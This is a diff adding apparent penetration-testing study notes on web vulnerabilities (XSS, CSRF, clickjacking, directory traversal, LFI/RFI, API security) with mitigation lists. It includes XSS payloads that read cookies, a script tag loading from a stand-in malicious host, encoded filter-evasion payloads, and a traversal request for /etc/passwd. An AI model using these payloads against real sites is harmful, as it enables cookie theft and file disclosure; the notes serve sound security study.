@@ -200,3 +200,141 @@ authentication-based vulnerabilities:
   -  session hijacking
   -  default credentials
 
+XSS:
+Reflected XSS
+Stored (persistent) XSS
+DOM-based XSS
+
+You typically find XSS vulnerabilities in the following:
+  -  Search fields that echo a search string back to the user
+  -  HTTP headers
+  -  Input fields that echo user data
+  -  Error messages that return user-supplied text
+  -  Hidden fields that may include user input data
+  -  Applications (or websites) that display user-supplied data
+
+The following example shows an XSS test that can be performed from a browser’s address bar:
+javascript:alert("Omar_s_XSS test");
+javascript:alert(document.cookie);
+
+The following example shows an XSS test that can be performed in a user input field in a web form:
+<script>alert("XSS Test")</script>
+
+Reflected:
+The attacker sends a malicious email, text, anything with a link to a vulnerable webpage. If the victim clicks on the link it can send sensitive data to the attacker.
+
+Stored:
+The malicious code is stored on the web application...like a comment in a guestbook. if anyone clicks on the guestbook it will affects the victim.
+
+DOM-based attacks are typically reflected XSS attacks that are triggered by sending a link with inputs that are reflected to the web browser. In DOM-based XSS attacks, 
+the payload is never sent to the server. Instead, the payload is only processed by the web client (browser).
+
+examples:
+<SCRIPT SRC=http://malicious.h4cker.org/xss.js></SCRIPT>
+<img src="javascript:alert('xss');">
+<img src=javascript:alert('xss')>
+<img src=javascript:alert(&quot;XSS&quot;)>
+<img src=javascript:alert('xss')>
+<a onmouseover="alert(document.cookie)">This is a malicious link</a>
+<a onmouseover=alert(document.cookie)>This is a malicious link</a>
+Evading xss filters:
+<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&
+#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+¼script¾alert(¢XSS¢)¼/script¾
+Evasion with using HTML embed:
+<EMBED SRC=”data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH
+A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcm
+cvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3
+hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaW
+dodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdC
+I+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" 
+AllowScriptAccess="always"></EMBED>
+
+The following are general rules for preventing XSS attacks, according to OWASP:
+  -  Use an auto-escaping template system.
+  -  Never insert untrusted data except in allowed locations.
+  -  Use HTML escape before inserting untrusted data into HTML element content.
+  -  Use attribute escape before inserting untrusted data into HTML common attributes.
+  -  Use JavaScript escape before inserting untrusted data into JavaScript data values.
+  -  Use CSS escape and strictly validate before inserting untrusted data into HTML-style property values.
+  -  Use URL escape before inserting untrusted data into HTML URL parameter values.
+  -  Sanitize HTML markup with a library such as ESAPI to protect the underlying application.
+  -  Prevent DOM-based XSS by following OWASP’s recommendations at https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html.
+  -  Use the HTTPOnly cookie flag.
+  -  Implement content security policy.
+  -  Use the X-XSS-Protection response header.
+
+Also:
+  -  Convert & to **&amp;.**
+  -  Convert < to **&lt;**.
+  -  Convert > to **&gt;.**
+  -  Convert “ to **&quot;.**
+  -  Convert “ to **&#x27;.**
+  -  Convert / to **&#x2F;.**
+
+<iframe src="http://h4cker.org"></iframe>
+
+
+CSRF/XSRF:
+
+Cross-site request forgery (abbreviated CSRF or XSRF) attacks occur when unauthorized commands are transmitted from a user who is trusted by an application. 
+CSRF attacks are different from XSS attacks because they exploit the trust that an application has in a user’s browser.
+
+Clicjacking:
+Clickjacking involves using multiple transparent or opaque layers to induce a user into clicking on a web button or link on a page that he or she was not intended to navigate or click. 
+
+Directory tracersal:
+A directory traversal vulnerability (often referred to as path traversal ) can allow attackers to access files and directories that are stored outside the web root folder.
+example:
+http://192.168.78.8:66/vulnerabilities/fi/?page=../../../../../etc/passwd
+%2e%2e%2f is the same as ../
+%2e%2e/ is the same as ../
+..%2f is the same as ../
+%2e%2e%5c is the same as ..
+
+Mitigating directory traversal vulnerabilities:
+  -  Understand how the underlying operating system processes filenames provided by a user or an application.
+  -  Never store sensitive configuration files inside the web root directory.
+  -  Prevent user input when using file system calls.
+  -  Prevent users from supplying all parts of the path. You can do this by surrounding the user input with your path code.
+  -  Perform input validation by only accepting known good input.
+
+Cookie manipulation attacks are often referred to as stored DOM-based attacks (or vulnerabilities ). Cookie manipulation is possible when vulnerable applications store user input and then 
+embed that input in a response within a part of the DOM. This input is later processed in an unsafe manner by a client-side script. An attacker can use a JavaScript string (or other scripts) 
+to trigger the DOM-based vulnerability. Such scripts can write controllable data into the value of a cookie.
+
+Local File Inclusion Vulnerabilities:
+A local file inclusion (LFI) vulnerability occurs when a web application allows a user to submit input into files or upload files to the server.
+
+Remote file inclusion (RFI) vulnerabilities are similar to LFI vulnerabilities. However, when an attacker exploits an RFI vulnerability, instead of accessing a file on the victim, 
+the attacker is able to execute code hosted on his or her own system (the attacking system).
+
+Unprotected APIs
+
+methods behind modern API-s:
+  -  Simple Object Access Protocol (SOAP) --->XML
+  -  Representational state trasfer (REST)--->JSON
+  -  GraphQL
+
+API documentation:
+  -  Swagger (OpenAPI)
+  -  Web Services Description Language (WSDL) documents      --->XML web services
+  -  Web Application Description Language (WADL) documents   --->XML web application
+
+The following are several general best practices and recommendations for securing APIs:
+  -  Secure API services to provide HTTPS endpoints with only a strong version of TLS.
+  -  Validate parameters in the application and sanitize incoming data from API clients.
+  -  Explicitly scan for common attack signatures; injection attacks often betray themselves by following common patterns.
+  -  Use strong authentication and authorization standards.
+  -  Use reputable and standard libraries to create the APIs.
+  -  Segment API implementation and API security into distinct tiers; doing so frees up the API developer to focus completely on the application domain.
+  -  Identify what data should be publicly available and what information is sensitive.
+  -  If possible, have a security expert do the API code verification.
+  -  Make internal API documentation mandatory.
+  -  Avoid discussing company API development (or any other application development) on public forums.
+
+HTTP proxies act as both servers and clients. Proxies enable HTTP transfers across firewalls and support the caching of HTTP messages
+SSID can be easily fingerprinted...
+Mitigation against session fixation attacks: Session id is exchanged only tough encrypted channel
+HTTPOnly flag forces the web browser to have this cookie processed only by the server and any attempt to access the cookie from client-based code or scripts is strictly forbidden.
+
